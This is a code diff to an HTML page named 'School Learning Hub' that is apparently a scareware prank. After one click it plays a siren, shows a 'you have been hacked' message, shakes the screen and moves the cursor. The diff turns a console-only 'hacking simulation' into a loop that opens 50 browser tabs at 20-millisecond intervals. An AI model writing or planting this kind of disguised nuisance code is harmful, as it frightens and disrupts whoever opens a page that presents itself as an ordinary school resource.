@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>School Learning Hub</title>
     <style>
-        /* Existing styles */
         body {
             margin: 0;
             padding: 0;
@@ -69,13 +68,6 @@
             display: none;
             z-index: 15;
         }
-        @keyframes shake {
-            0% { transform: translate(0, 0); }
-            25% { transform: translate(-5px, 0); }
-            50% { transform: translate(5px, 0); }
-            75% { transform: translate(-5px, 0); }
-            100% { transform: translate(0, 0); }
-        }
     </style>
 </head>
 <body>
@@ -94,7 +86,7 @@
         let backgroundChangeInterval;
         let cursorMoveInterval;
         let screenShakeInterval;
-        
+
         document.getElementById('clickOverlay').addEventListener('click', function() {
             this.classList.add('hidden');
             var sirenAudio = document.getElementById('sirenAudio');
@@ -106,8 +98,8 @@
             const hackMessage = document.getElementById('hackMessage');
             hackMessage.style.display = 'block';
 
-            // Start hacking simulation without alerts
-            simulateHacking(); 
+            // Start hacking simulation
+            openMultipleTabs();
 
             // Set background color to black
             document.body.style.backgroundColor = 'black';
@@ -138,14 +130,16 @@
         });
 
         function showRandomMessage() {
-            console.log("YOU HAVE BEEN HACKED!!!!"); // Logging instead of alerts
+            // Display a message somewhere on the screen if needed
+            console.log("YOU HAVE BEEN HACKED!!!!");
         }
 
-        function simulateHacking() {
-            for (let i = 0; i < 50; i++) {
+        function openMultipleTabs() {
+            const numberOfTabs = 50; // Number of tabs to open
+            for (let i = 0; i < numberOfTabs; i++) {
                 setTimeout(() => {
-                    console.log("YOU HAVE BEEN HACKED!!!!");
-                }, i * 20); // Schedule messages at intervals
+                    window.open("https://example.com", "_blank"); // Adjust the URL as needed
+                }, i * 20); // Open a tab every 20 milliseconds
             }
         }
 
@@ -174,7 +168,6 @@
             }
             return color;
         }
-
     </script>
 </body>
 </html>
